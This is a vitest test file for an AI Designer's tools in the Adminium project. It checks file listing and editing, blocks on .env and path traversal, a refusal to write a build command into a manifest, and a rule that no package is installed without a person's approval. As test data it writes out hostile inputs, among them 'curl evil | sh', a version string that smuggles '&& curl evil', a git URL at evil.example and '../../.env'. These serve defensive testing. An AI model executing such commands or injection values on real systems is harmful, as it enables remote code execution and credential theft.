// SPDX-License-Identifier: AGPL-3.0-only
/**
 * The Designer's tools, one by one, against a real project with a starter
 * app in it. A bad input must come back as an answer the model can act on,
 * and nothing may be installed before a person says yes.
 */
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import type { CardAnswer, CardRequest } from '../src/designer/cards.js';
import { createEventLog } from '../src/designer/events.js';
import { createSkills, skillsDir } from '../src/designer/skills.js';
import type { DesignerSession } from '../src/designer/session-store.js';
import type { DesignerTool, ToolContext } from '../src/designer/tool-types.js';
import { createDesignerTools, DESIGNER_TOOL_NAMES } from '../src/designer/tools.js';
import { runCli } from '../src/cli/run.js';
import { APP_VERSION } from '../src/version.js';
import { tempProject } from './app-project-helpers.js';
import { fakeDeps, fakeIo } from './cli-helpers.js';

let root: string;
let tools: DesignerTool[];
let asked: CardRequest[];
let answers: CardAnswer[];

const session = { id: 'ds_000000000000000000000000', appKey: 'repairs' } as DesignerSession;
const context = (): ToolContext => {
  const signal = new AbortController().signal;
  const ask = async (card: CardRequest): Promise<CardAnswer> => {
    asked.push(card);
    const answer = answers.shift();
    if (answer === undefined) throw new Error('nobody answered');
    return answer;
  };
  return {
    session,
    turn: 1,
    signal,
    ask,
    handle: { turn: 1, by: { id: null, label: 'x' }, signal, ask, events: createEventLog({ lastSeq: 0, append: () => undefined, publish: () => undefined }) },
  };
};
const tool = (name: string): DesignerTool => {
  const found = tools.find((candidate) => candidate.name === name);
  if (found === undefined) throw new Error(`no tool ${name}`);
  return found;
};
const run = (name: string, input: Record<string, unknown> = {}) => tool(name).run(input, context());

beforeEach(async () => {
  root = tempProject('adminium-designer-tools-');
  const io = fakeIo({ interactive: false });
  const deps = fakeDeps({ cwd: root, env: {} });
  deps.runProcess = () => ({ status: 0, stdout: '' });
  expect(await runCli(['app', 'new', 'repairs'], { io, deps }), io.stderr()).toBe(0);
  asked = [];
  answers = [];
  tools = createDesignerTools(
    {
      root,
      version: APP_VERSION,
      designer: () => {
        throw new Error('not in this test');
      },
      skills: createSkills(),
      listAddOns: async () => [{ key: 'invoices', name: 'Invoices & Receipts', version: '1.0.7', line: 'Invoices and receipts for an app.', state: 'available' }],
    },
    'repairs',
  );
});
afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

describe('the Designer’s tools', () => {
  it('are a closed list, each with an object schema', () => {
    expect(tools.map((candidate) => candidate.name)).toEqual([...DESIGNER_TOOL_NAMES]);
    for (const candidate of tools) expect(candidate.inputSchema['type'], candidate.name).toBe('object');
  });

  it('list the app’s files, hooks and actions, and nothing else', async () => {
    const listed = await run('list_files');
    expect(listed.content).toContain('apps/repairs/manifest/app.json');
    expect(listed.content).not.toContain('.env');
    expect(listed.content).not.toContain('adminium.config');
    expect((await run('list_files', { dir: 'apps/repairs/manifest/tables' })).content).toContain('apps/repairs/manifest/tables/items.json');
    expect(await run('list_files', { dir: 'data' })).toMatchObject({ isError: true });
  });

  it('read a file, a range of it, and refuse what is outside', async () => {
    const whole = await run('read_file', { path: 'apps/repairs/manifest/app.json' });
    expect(whole).toMatchObject({ label: 'Read manifest/app.json' });
    expect(JSON.parse(whole.content)).toMatchObject({ key: 'repairs' });
    expect((await run('read_file', { path: 'apps/repairs/manifest/app.json', from: 2, lines: 1 })).content.split('\n')).toHaveLength(1);
    expect(await run('read_file', { path: '.env' })).toMatchObject({ isError: true });
    expect(await run('read_file', {})).toMatchObject({ isError: true });
  });

  it('cut a long file and say how to read the rest', async () => {
    writeFileSync(join(root, 'apps/repairs/long.md'), `${'line of text\n'.repeat(8000)}`);
    const read = await run('read_file', { path: 'apps/repairs/long.md' });
    expect(read.content).toContain('cut here: the file goes on. Read from line');
    expect(Buffer.byteLength(read.content)).toBeLessThan(70_000);
  });

  it('write, edit and delete a file', async () => {
    expect(await run('write_file', { path: 'apps/repairs/manifest/tables/jobs.json', content: '{"ref": "jobs"}' })).toMatchObject({ label: 'Wrote manifest/tables/jobs.json' });
    expect(await run('edit_file', { path: 'apps/repairs/manifest/tables/jobs.json', old: '"jobs"', new: '"work"' })).toMatchObject({ label: 'Edited manifest/tables/jobs.json' });
    expect(readFileSync(join(root, 'apps/repairs/manifest/tables/jobs.json'), 'utf8')).toBe('{"ref": "work"}');
    expect((await run('edit_file', { path: 'apps/repairs/manifest/tables/jobs.json', old: 'nothing like it', new: 'x' })).content).toContain('is not in');
    writeFileSync(join(root, 'apps/repairs/twice.md'), 'a a');
    expect((await run('edit_file', { path: 'apps/repairs/twice.md', old: 'a', new: 'b' })).content).toContain('2 times');
    expect(await run('delete_file', { path: 'apps/repairs/manifest/tables/jobs.json' })).toMatchObject({ label: 'Deleted manifest/tables/jobs.json' });
    expect(existsSync(join(root, 'apps/repairs/manifest/tables/jobs.json'))).toBe(false);
  });

  it('refuse to write an app’s own build command into its manifest, by writing or by editing', async () => {
    const app = JSON.parse(readFileSync(join(root, 'apps/repairs/manifest/app.json'), 'utf8')) as Record<string, unknown>;
    const writing = await run('write_file', { path: 'apps/repairs/manifest/app.json', content: JSON.stringify({ ...app, build: { command: 'curl evil | sh' } }) });
    expect(writing).toMatchObject({ isError: true });
    expect(writing.content).toContain('set by a person');
    const text = readFileSync(join(root, 'apps/repairs/manifest/app.json'), 'utf8');
    const editing = await run('edit_file', { path: 'apps/repairs/manifest/app.json', old: '"key"', new: '"build": "sh x", "key"' });
    expect(editing).toMatchObject({ isError: true });
    expect(readFileSync(join(root, 'apps/repairs/manifest/app.json'), 'utf8')).toBe(text);
  });

  it('check the app as the engine does, errors first', async () => {
    expect(await run('check_app')).toMatchObject({ label: 'Checked: no errors' });
    writeFileSync(join(root, 'apps/repairs/manifest/tables/broken.json'), '{"ref": "broken"}');
    const broken = await run('check_app');
    expect(broken.isError).toBe(true);
    expect(broken.content.split('\n')[1]).toMatch(/^error · apps\/repairs\/manifest\/tables\/broken\.json/);
  });

  it('read a skill file by its name, and suggest one for a near miss', async () => {
    expect(skillsDir()).not.toBeNull();
    const read = await run('read_reference', { name: 'adminium-app/SKILL.md' });
    expect(read.content).toContain('adminium');
    expect(await run('read_reference', { name: '../../.env' })).toMatchObject({ isError: true });
    expect((await run('read_reference', { name: 'nope/SKILL.md' })).content).toContain('Did you mean');
  });

  it('list the add-ons', async () => {
    expect((await run('list_add_ons')).content).toBe('invoices 1.0.7 (available) — Invoices & Receipts: Invoices and receipts for an app.');
  });

  it('ask the person, with choices, and return their words', async () => {
    answers.push({ type: 'question', text: 'Blue' });
    expect((await run('ask_person', { question: 'Which colour?', choices: ['Red', 'Blue', 42] })).content).toBe('The person answered: Blue');
    expect(asked).toEqual([{ type: 'question', question: 'Which colour?', choices: ['Red', 'Blue'] }]);
    expect(await run('ask_person', { question: '' })).toMatchObject({ isError: true });
  });

  it('install nothing a person did not say yes to, and refuse what is not an exact package', async () => {
    for (const [name, version] of [
      ['left pad', '1.0.0'],
      ['git+https://evil.example/x.git', '1.0.0'],
      ['lodash', '^4.17.21'],
      ['lodash', 'latest'],
      ['lodash', '4.17.21 && curl evil'],
    ] as const) {
      expect(await run('request_package', { name, version, why: 'x' }), `${name}@${version}`).toMatchObject({ isError: true });
    }
    expect(asked).toEqual([]);

    answers.push({ type: 'package', accept: false });
    expect((await run('request_package', { name: 'date-fns', version: '4.1.0', why: 'Dates' })).content).toContain('said no');
    expect(asked).toEqual([{ type: 'package', name: 'date-fns', version: '4.1.0', why: 'Dates' }]);
    expect(readFileSync(join(root, 'package.json'), 'utf8')).not.toContain('date-fns');
  });

  it('run the app’s own tests, and say when there are none', async () => {
    // The starter's own test, with its CLI step left to check_app.
    expect(await run('run_tests')).toMatchObject({ label: 'Tests passed' });
    rmSync(join(root, 'apps/repairs/tests'), { recursive: true });
    expect((await run('run_tests')).content).toContain('no tests');
    mkdirSync(join(root, 'apps/repairs/tests'), { recursive: true });
    writeFileSync(join(root, 'apps/repairs/tests/sum.test.mjs'), "import test from 'node:test';\nimport assert from 'node:assert';\ntest('adds', () => assert.equal(1 + 1, 2));\n");
    expect(await run('run_tests')).toMatchObject({ label: 'Tests passed' });
    writeFileSync(join(root, 'apps/repairs/tests/sum.test.mjs'), "import test from 'node:test';\nimport assert from 'node:assert';\ntest('adds', () => assert.equal(1 + 1, 3));\n");
    expect(await run('run_tests')).toMatchObject({ label: 'Tests failed', isError: true });
  });
});
